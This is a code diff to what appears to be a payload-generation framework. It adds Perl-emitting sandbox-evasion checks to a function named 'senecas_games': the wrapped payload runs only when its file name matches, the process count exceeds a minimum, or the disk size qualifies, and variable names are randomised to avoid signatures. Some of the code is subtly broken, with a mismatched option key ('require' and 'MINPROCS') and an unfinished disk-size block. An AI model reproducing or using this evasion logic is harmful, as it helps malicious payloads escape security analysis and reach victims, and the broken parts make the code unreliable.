@@ -411,9 +411,48 @@ def senecas_games(evasion_payload):
             # Add a tab for this check
             num_tabs_required += 1
 
+        if evasion_payload.required_options["FILENAME"][0].lower() != 'x':
+
+            expected_name = evasion_helpers.randomString()
+            actual_name = evasion_helpers.randomString()
+
+            check_code += '\t' * num_tabs_required + 'use File::Basename;\n'
+            check_code += '\t' * num_tabs_required + 'my $' + expected_name + ' = "' + evasion_payload.required_options["FILENAME"][0].lower() + '";\n'
+            check_code += '\t' * num_tabs_required + 'my $' + actual_name + ' = basename($0);\n'
+            check_code += '\t' * num_tabs_required + 'if (index($' + actual_name + ', $' + expected_name + ') != -1) {\n'
+
+            # Add a tab for this check
+            num_tabs_required += 1
+        
+        if evasion_payload.required_options["NUMPROCS"][0].lower() != 'x':
+
+            min_procs = evasion_helpers.randomString()
+            wmi_var = evasion_helpers.randomString()
+            total_procs = evasion_helpers.randomString()
+
+            check_code += '\t' * num_tabs_required + 'use Win32::OLE;\n'
+            check_code += '\t' * num_tabs_required + 'my $' + min_procs + ' = ' + evasion_payload.require["MINPROCS"][0] + ';\n'
+            check_code += '\t' * num_tabs_required + 'my $' + wmi_var + ' = Win32::OLE->GetObject("winmgmts:\\\\localhost\\root\\CIMV2") or die;\n'
+            check_code += '\t' * num_tabs_required + 'my $' + total_procs + ' = $' + wmi_var + '->ExecQuery("SELECT * FROM Win32_Process")->{Count} or die;\n'
+            check_code += '\t' * num_tabs_required + 'if ($' + total_procs + ' > $' + min_procs + ') {\n'
+
+            # Add a tab for this check
+            num_tabs_required += 1
+        
+        if evasion_payload.required_options["DISKSIZE"][0].lower() != 'x':
+
+            min_disksize = evasion_helpers.randomString()
+            file_object = evasion_helpers.randomString()
+
+            check_code += '\t' * num_tabs_required + 'use Win32::OLE;\n'
+            check_code += '\t' * num_tabs_required + 'my $' + min_disksize + ' = 50;\n'
+            check_code += '\t' * num_tabs_required + 'my $' + file_object + ' = Win32::OLE->CreateObject("Scripting.FileSystemObject");\n'
+
+
         if evasion_payload.required_options["USERNAME"][0].lower() != "x":
 
             rand_name = evasion_helpers.randomString()
+
             check_code += '\t' * num_tabs_required + 'my $' + rand_name + ' = Win32::LoginName;\n'
             check_code += '\t' * num_tabs_required + 'if (index(lc($' + rand_name + '), lc(\"' + evasion_payload.required_options["USERNAME"][0] + '\")) != -1){\n'
 
